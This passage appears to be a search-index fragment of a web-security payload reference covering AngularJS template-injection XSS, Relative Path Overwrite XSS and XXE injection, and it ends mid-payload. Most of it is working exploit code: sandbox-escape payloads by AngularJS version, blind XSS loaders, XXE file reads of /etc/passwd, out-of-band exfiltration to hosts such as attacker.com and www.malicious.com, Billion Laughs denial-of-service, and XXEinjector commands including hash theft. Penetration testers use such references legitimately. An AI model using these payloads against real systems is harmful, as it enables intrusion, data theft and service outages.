{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} Blind XSS 1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53) {{ constructor.constructor(\"var _ = document.createElement('script'); _.src='//localhost/m'; document.getElementsByTagName('body')[0].appendChild(_)\")() }} Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger) {{ $on.constructor(\"var _ = document.createElement('script'); _.src='//localhost/m'; document.getElementsByTagName('body')[0].appendChild(_)\")() }} 1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger) {{ a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim; $eval('a\",eval(`var _=document\\\\x2ecreateElement(\\'script\\'); _\\\\x2esrc=\\'//localhost/m\\'; document\\\\x2ebody\\\\x2eappendChild(_);`),\"') }} 1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero) {{ (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval(\" var _ = document.createElement(\\'script\\'); _.src=\\'//localhost/m\\'; document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")')() }} 1.2.19 (FireFox) by Mathias Karlsson {{ toString.constructor.prototype.toString=toString.constructor.prototype.call; [\"a\",'eval(\"var _ = document.createElement(\\'script\\'); _.src=\\'//localhost/m\\'; document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")'].sort(toString.constructor); }} 1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger) {{ a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim; $eval('a\",eval(` var _=document\\\\x2ecreateElement(\\'script\\'); _\\\\x2esrc=\\'//localhost/m\\'; document\\\\x2ebody\\\\x2eappendChild(_);`),\"') }} 1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger) {{ a=toString().constructor.prototype;a.charAt=a.trim; $eval('a,eval(` var _=document\\\\x2ecreateElement(\\'script\\'); _\\\\x2esrc=\\'//localhost/m\\'; document\\\\x2ebody\\\\x2eappendChild(_);`),a') }} 1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger) {{ a=toString().constructor.prototype;a.charAt=a.trim; $eval('a,eval(`var _=document.createElement(\\'script\\'); _.src=\\'//localhost/m\\';document.body.appendChild(_);`),a') }} 1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero) {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply; c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};\"); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }} Automatic Sanitization To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values. However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods: bypassSecurityTrustHtml bypassSecurityTrustScript bypassSecurityTrustStyle bypassSecurityTrustUrl bypassSecurityTrustResourceUrl Example of a component using the unsecure method bypassSecurityTrustUrl : import { Component, OnInit } from '@angular/core'; @Component({ selector: 'my-app', template: ` <h4>An untrusted URL:</h4> <p><a class=\"e2e-dangerous-url\" [href]=\"dangerousUrl\">Click me</a></p> <h4>A trusted URL:</h4> <p><a class=\"e2e-trusted-url\" [href]=\"trustedUrl\">Click me</a></p> `, }) export class App { constructor(private sanitizer: DomSanitizer) { this.dangerousUrl = 'javascript:alert(\"Hi there\")'; this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl); } } When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application. References XSS without HTML - CSTI with Angular JS - Portswigger Blind XSS AngularJS Payloads Angular Security Bypass DomSanitizer","title":"XSS in Angular and AngularJS"},{"location":"XSS%20Injection/XSS%20in%20Angular/#xss-in-angular-and-angularjs","text":"","title":"XSS in Angular and AngularJS"},{"location":"XSS%20Injection/XSS%20in%20Angular/#client-side-template-injection","text":"The following payloads are based on Client Side Template Injection.","title":"Client Side Template Injection"},{"location":"XSS%20Injection/XSS%20in%20Angular/#storedreflected-xss-simple-alert-in-angularjs","text":"AngularJS as of version 1.6 have removed the sandbox altogether AngularJS 1.6+ by Mario Heiderich {{constructor.constructor('alert(1)')()}} AngularJS 1.6+ by @brutelogic {{[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41}} Example available at https://brutelogic.com.br/xss.php AngularJS 1.6.0 by @LewisArdern & @garethheyes {{0[a='constructor'][a]('alert(1)')()}} {{$eval.constructor('alert(1)')()}} {{$on.constructor('alert(1)')()}} AngularJS 1.5.9 - 1.5.11 by Jan Horn {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; \"); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }} AngularJS 1.5.0 - 1.5.8 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} AngularJS 1.4.0 - 1.4.9 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} AngularJS 1.3.20 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} AngularJS 1.3.19 {{ 'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=alert(1)//'); }} AngularJS 1.3.3 - 1.3.18 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//'); }} AngularJS 1.3.1 - 1.3.2 {{ {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); }} AngularJS 1.3.0 {{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )) );}} AngularJS 1.2.24 - 1.2.29 {{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}} AngularJS 1.2.19 - 1.2.23 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}} AngularJS 1.2.6 - 1.2.18 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} AngularJS 1.2.2 - 1.2.5 {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}} AngularJS 1.2.0 - 1.2.1 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} AngularJS 1.0.1 - 1.1.5 and Vue JS {{constructor.constructor('alert(1)')()}}","title":"Stored/Reflected XSS - Simple alert in AngularJS"},{"location":"XSS%20Injection/XSS%20in%20Angular/#advanced-bypassing-xss","text":"AngularJS (without ' single and \" double quotes) by @Viren {{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}} AngularJS (without ' single and \" double quotes and constructor string) {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}} {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}","title":"Advanced bypassing XSS"},{"location":"XSS%20Injection/XSS%20in%20Angular/#blind-xss","text":"1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53) {{ constructor.constructor(\"var _ = document.createElement('script'); _.src='//localhost/m'; document.getElementsByTagName('body')[0].appendChild(_)\")() }} Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger) {{ $on.constructor(\"var _ = document.createElement('script'); _.src='//localhost/m'; document.getElementsByTagName('body')[0].appendChild(_)\")() }} 1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger) {{ a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim; $eval('a\",eval(`var _=document\\\\x2ecreateElement(\\'script\\'); _\\\\x2esrc=\\'//localhost/m\\'; document\\\\x2ebody\\\\x2eappendChild(_);`),\"') }} 1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero) {{ (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval(\" var _ = document.createElement(\\'script\\'); _.src=\\'//localhost/m\\'; document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")')() }} 1.2.19 (FireFox) by Mathias Karlsson {{ toString.constructor.prototype.toString=toString.constructor.prototype.call; [\"a\",'eval(\"var _ = document.createElement(\\'script\\'); _.src=\\'//localhost/m\\'; document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")'].sort(toString.constructor); }} 1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger) {{ a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim; $eval('a\",eval(` var _=document\\\\x2ecreateElement(\\'script\\'); _\\\\x2esrc=\\'//localhost/m\\'; document\\\\x2ebody\\\\x2eappendChild(_);`),\"') }} 1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger) {{ a=toString().constructor.prototype;a.charAt=a.trim; $eval('a,eval(` var _=document\\\\x2ecreateElement(\\'script\\'); _\\\\x2esrc=\\'//localhost/m\\'; document\\\\x2ebody\\\\x2eappendChild(_);`),a') }} 1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger) {{ a=toString().constructor.prototype;a.charAt=a.trim; $eval('a,eval(`var _=document.createElement(\\'script\\'); _.src=\\'//localhost/m\\';document.body.appendChild(_);`),a') }} 1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero) {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply; c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};\"); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}","title":"Blind XSS"},{"location":"XSS%20Injection/XSS%20in%20Angular/#automatic-sanitization","text":"To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values. However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods: bypassSecurityTrustHtml bypassSecurityTrustScript bypassSecurityTrustStyle bypassSecurityTrustUrl bypassSecurityTrustResourceUrl Example of a component using the unsecure method bypassSecurityTrustUrl : import { Component, OnInit } from '@angular/core'; @Component({ selector: 'my-app', template: ` <h4>An untrusted URL:</h4> <p><a class=\"e2e-dangerous-url\" [href]=\"dangerousUrl\">Click me</a></p> <h4>A trusted URL:</h4> <p><a class=\"e2e-trusted-url\" [href]=\"trustedUrl\">Click me</a></p> `, }) export class App { constructor(private sanitizer: DomSanitizer) { this.dangerousUrl = 'javascript:alert(\"Hi there\")'; this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl); } } When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.","title":"Automatic Sanitization"},{"location":"XSS%20Injection/XSS%20in%20Angular/#references","text":"XSS without HTML - CSTI with Angular JS - Portswigger Blind XSS AngularJS Payloads Angular Security Bypass DomSanitizer","title":"References"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/","text":"XSS with Relative Path Overwrite - IE 8/9 and lower You need these 3 components 1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))} 2) URL Rewriting. 3) Relative addressing to CSS style sheet : ../style.css A little example http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE] <html> <head> <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /> <link href=\"[RELATIVE_URL_INSERTED_HERE]/styles.css\" rel=\"stylesheet\" type=\"text/css\" /> </head> <body> Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))} </body> </html> Explanation of the vulnerability The Meta element forces IE\u2019s document mode into IE7 compatible which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use \u201copen\u201d to prevent client side DoS with repeated executions of alert. A simple request of \u201crpo.php/\u201d makes the relative style load the page itself as a style sheet. The actual request is \u201c/labs/xss_horror_show/chapter7/rpo.php/styles.css\u201d the browser thinks there\u2019s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works. Demo 1 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php Demo 2 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3 MultiBrowser : http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo3.php From : http://www.thespanner.co.uk/2014/03/21/rpo/ Mutated XSS for Browser IE8/IE9 <listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing> <script>alert(document.getElementById('x').innerHTML)</script> IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute. References TODO","title":"XSS with Relative Path Overwrite - IE 8/9 and lower"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/#xss-with-relative-path-overwrite-ie-89-and-lower","text":"You need these 3 components 1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))} 2) URL Rewriting. 3) Relative addressing to CSS style sheet : ../style.css A little example http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE] <html> <head> <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /> <link href=\"[RELATIVE_URL_INSERTED_HERE]/styles.css\" rel=\"stylesheet\" type=\"text/css\" /> </head> <body> Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))} </body> </html> Explanation of the vulnerability The Meta element forces IE\u2019s document mode into IE7 compatible which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use \u201copen\u201d to prevent client side DoS with repeated executions of alert. A simple request of \u201crpo.php/\u201d makes the relative style load the page itself as a style sheet. The actual request is \u201c/labs/xss_horror_show/chapter7/rpo.php/styles.css\u201d the browser thinks there\u2019s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works. Demo 1 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php Demo 2 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3 MultiBrowser : http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo3.php From : http://www.thespanner.co.uk/2014/03/21/rpo/","title":"XSS with Relative Path Overwrite - IE 8/9 and lower"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/#mutated-xss-for-browser-ie8ie9","text":"<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing> <script>alert(document.getElementById('x').innerHTML)</script> IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute.","title":"Mutated XSS for Browser IE8/IE9"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/#references","text":"TODO","title":"References"},{"location":"XXE%20Injection/","text":"XML External Entity An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server. Internal Entity : If an entity is declared within a DTD it is called as internal entity. Syntax: <!ENTITY entity_name \"entity_value\"> External Entity : If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM . Syntax: <!ENTITY entity_name SYSTEM \"entity_value\"> Summary Tools Detect the vulnerability Exploiting XXE to retrieve files Classic XXE Classic XXE Base64 encoded PHP Wrapper inside XXE XInclude attacks Exploiting XXE to perform SSRF attacks Exploiting XXE to perform a deny of service Billion Laugh Attack Error Based XXE Exploiting blind XXE to exfiltrate data out-of-band Blind XXE XXE OOB Attack (Yunusov, 2013) XXE OOB with DTD and PHP filter XXE OOB with Apache Karaf Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents XXE in exotic files XXE inside SVG XXE inside SOAP XXE inside DOCX file XXE inside XLSX file XXE inside DTD file XXE WAF Bypass via convert character encoding Tools xxeftp - A mini webserver with FTP support for XXE payloads sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555 230-OOB - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via http://xxe.sh/ $ python3 230.py 2121 XXEinjector - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods bash # Enumerating /etc directory in HTTPS application: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl # Enumerating /etc directory using gopher for OOB method: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher # Second order exploitation: ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt # Bruteforcing files using HTTP out of band method and netdoc protocol: ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc # Enumerating using direct exploitation: ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK # Enumerating unfiltered ports: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all # Stealing Windows hashes: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes # Uploading files using Java jar: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf # Executing system commands using PHP expect: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls # Testing for XSLT injection: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt # Log requests only: ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt oxml_xxe - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF) ruby server.rb docem - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx otori - Toolbox intended to allow useful exploitation of XXE vulnerabilities. python ./otori.py --clone --module \"G-XXE-Basic\" --singleuri \"file:///etc/passwd\" --module-options \"TEMPLATEFILE\" \"TARGETURL\" \"BASE64ENCODE\" \"DOCTYPE\" \"XMLTAG\" --outputbase \"./output-generic-solr\" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs Detect the vulnerability Basic entity test, when the XML parser parses the external entities the result should contain \"John\" in firstName and \"Doe\" in lastName . Entities are defined inside the DOCTYPE element. <!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY example \"Doe\"> ]> <userInfo> <firstName>John</firstName> <lastName>&example;</lastName> </userInfo> It might help to set the Content-Type: application/xml in the request when sending XML payload to the server. Exploiting XXE to retrieve files Classic XXE We try to display the content of the file /etc/passwd <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root> <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM \"file:///etc/passwd\"> ]> <data>&file;</data> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo> :warning: SYSTEM and PUBLIC are almost synonym. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo> Classic XXE Base64 encoded <!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/> PHP Wrapper inside XXE <!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]> <contacts> <contact> <name>Jean &xxe; Dupont</name> <phone>00 11 22 33 44</phone> <address>42 rue du CTF</address> <zipcode>75000</zipcode> <city>Paris</city> </contact> </contacts> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" > ]> <foo>&xxe;</foo> XInclude attacks When you can't modify the DOCTYPE element use the XInclude to target <foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"> <xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo> Exploiting XXE to perform SSRF attacks XXE can be combined with the SSRF vulnerability to target another service on the network. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM \"http://internal.service/secret_pass.txt\" > ]> <foo>&xxe;</foo> Exploiting XXE to perform a deny of service :warning: : These attacks might kill the service or the server, do not use them on the production. Billion Laugh Attack <!DOCTYPE data [ <!ENTITY a0 \"dos\" > <!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"> <!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"> <!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"> <!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\"> ]> <data>&a4;</data> Yaml attack a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"] b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a] c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b] d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c] e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d] f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e] g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f] h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g] i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h] Error Based XXE Payload to trigger the XXE <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\"> %ext; ]> <message></message> Contents of ext.dtd <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; Exploiting blind XXE to exfiltrate data out-of-band Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack. Blind XXE The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator. <?xml version=\"1.0\" ?> <!DOCTYPE root [ <!ENTITY % ext SYSTEM \"http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x\"> %ext; ]> <r></r> Send the content of /etc/passwd to \"www.malicious.com\", you may receive only the first line. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM \"file:///etc/passwd\" > <!ENTITY callhome SYSTEM \"www.malicious.com/?%xxe;\"> ] > <foo>&callhome;</foo> XXE OOB Attack (Yunusov, 2013) <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE data SYSTEM \"http://publicServer.com/parameterEntity_oob.dtd\"> <data>&send;</data> File stored on http://publicServer.com/parameterEntity_oob.dtd <!ENTITY % file SYSTEM \"file:///sys/power/image_size\"> <!ENTITY % all \"<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>\"> %all; XXE OOB with DTD and PHP filter <?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://127.0.0.1/dtd.xml\"> %sp; %param1; ]> <r>&exfil;</r> File stored on http://127.0.0.1/dtd.xml <!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> <!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>\"> XXE OOB with Apache Karaf CVE-2018-11788 affecting versions: Apache Karaf <= 4.2.1 Apache Karaf <= 4.1.6 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com\"> %dtd;] <features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\"> <feature name=\"deployer\" version=\"2.0\" install=\"auto\"> </feature> </features> Send the XML file to the deploy folder. Ref. brianwrf/CVE-2018-11788 XXE with local DTD In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this: <!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]> <root>&test;</root> If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename. <!DOCTYPE root [ <!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\"> %local_dtd; ]> <root></root> Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message. <!DOCTYPE root [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ISOamsa ' <!ENTITY &#x25; file SYSTEM 